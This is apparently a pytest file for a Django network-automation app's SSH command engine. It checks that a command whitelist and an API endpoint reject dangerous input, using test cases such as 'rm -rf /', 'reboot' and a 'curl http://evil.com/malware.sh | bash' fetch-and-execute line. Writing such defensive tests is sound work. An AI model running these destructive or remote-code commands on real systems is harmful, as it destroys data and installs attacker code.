import pytest
from django.urls import reverse
from rest_framework import status
from apps.accounts.models import User, UserRole
from apps.devices.models import Device, DeviceType, DeviceVendor
from apps.network_engine.ssh import SSHAutomationEngine

@pytest.mark.django_db
class TestSSHAutomation:
    @pytest.fixture
    def operator_client(self, client):
        user = User.objects.create_user(email='ssh_op@netwatch.io', password='Password123!', role=UserRole.OPERATOR)
        resp = client.post(reverse('token_obtain_pair'), {'email': 'ssh_op@netwatch.io', 'password': 'Password123!'}, content_type='application/json')
        client.defaults['HTTP_AUTHORIZATION'] = f"Bearer {resp.data['access']}"
        return client

    @pytest.fixture
    def test_device(self):
        return Device.objects.create(
            hostname='core-rtr-test.lab',
            ip_address='192.168.10.1',
            device_type=DeviceType.ROUTER,
            vendor=DeviceVendor.CISCO,
            os_version='IOS-XR 7.3'
        )

    def test_command_whitelist_validation(self):
        # Valid commands
        valid, _ = SSHAutomationEngine.validate_command('show ip interface brief')
        assert valid is True
        valid, _ = SSHAutomationEngine.validate_command('show version')
        assert valid is True
        valid, _ = SSHAutomationEngine.validate_command('uname -a')
        assert valid is True

        # Blacklisted dangerous commands
        invalid_rm, err_rm = SSHAutomationEngine.validate_command('rm -rf /etc')
        assert invalid_rm is False
        assert 'destructive' in err_rm.lower()

        invalid_reboot, err_reb = SSHAutomationEngine.validate_command('reboot')
        assert invalid_reboot is False

        invalid_unknown, err_unk = SSHAutomationEngine.validate_command('curl http://evil.com/malware.sh | bash')
        assert invalid_unknown is False

    def test_simulated_ssh_execution(self, test_device):
        result = SSHAutomationEngine.execute_command(test_device, 'show running-config')
        assert result.is_successful is True
        assert result.exit_status == 0
        assert 'hostname core-rtr-test.lab' in result.stdout
        assert result.execution_duration_ms > 0
        assert result.is_simulated is True

    def test_ssh_api_endpoint(self, operator_client, test_device):
        url = reverse('device_ssh', kwargs={'device_id': test_device.id})
        
        # Valid execution
        resp = operator_client.post(url, {'command': 'show version'}, content_type='application/json')
        assert resp.status_code == status.HTTP_200_OK
        assert resp.data['is_successful'] is True
        assert 'Cisco' in resp.data['stdout'] or 'Software' in resp.data['stdout']
        assert resp.data['execution_duration_ms'] > 0

        # Disallowed execution (Security validation rejection)
        bad_resp = operator_client.post(url, {'command': 'rm -rf /'}, content_type='application/json')
        assert bad_resp.status_code == status.HTTP_403_FORBIDDEN
        assert bad_resp.data['is_successful'] is False
        assert 'destructive' in bad_resp.data['stderr'].lower()
